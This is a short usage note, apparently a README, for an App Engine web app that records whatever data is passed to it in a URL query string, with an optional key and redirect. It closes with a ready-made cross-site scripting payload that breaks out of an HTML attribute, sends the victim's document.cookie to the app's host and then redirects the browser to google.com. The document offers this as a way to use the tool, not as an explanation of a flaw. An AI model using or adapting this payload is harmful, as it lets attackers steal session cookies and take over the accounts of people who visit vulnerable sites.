You could call it like this

	With ALLOW_USE_WITHOUT_KEY = True
		http://application_name.appspot.com/?data_you_want_to_send
		or
		http://application_name.appspot.com/?redirectLink=http://google.com&data_you_want_to_send
		or
		http://application_name.appspot.com/?key=your_key&data_you_want_to_send
		or
		http://application_name.appspot.com/?key=your_key&redirectLink=http://google.com&data_you_want_to_send
		
	With ALLOW_USE_WITHOUT_KEY = False
		http://application_name.appspot.com/?key=your_key&data_you_want_to_send
		or
		http://application_name.appspot.com/?key=your_key&redirectLink=http://google.com&data_you_want_to_send

	Possible use with XSS
	"><script>window.location="http://application_name.appspot.com/?key=your_key&redirectLink=http://google.com&".concat(document.cookie);</script><input type="hidden" value="
